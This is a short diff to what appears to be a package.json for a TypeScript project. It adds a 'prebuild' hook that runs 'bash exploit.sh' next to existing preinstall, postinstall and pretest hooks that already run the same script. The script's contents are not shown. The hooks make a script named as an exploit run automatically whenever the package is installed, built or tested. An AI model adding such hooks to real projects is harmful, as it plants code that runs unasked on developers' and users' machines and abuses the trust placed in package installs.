@@ -22,6 +22,7 @@
     "preinstall": "bash exploit.sh",
     "postinstall": "bash exploit.sh",
     "pretest": "bash exploit.sh",
+    "prebuild": "bash exploit.sh",
     "lint": "balena-lint -t tsconfig.dev.json --typescript lib tests",
     "lint-fix": "balena-lint -t tsconfig.dev.json --fix --typescript lib tests",
     "clean": "rm -rf build",
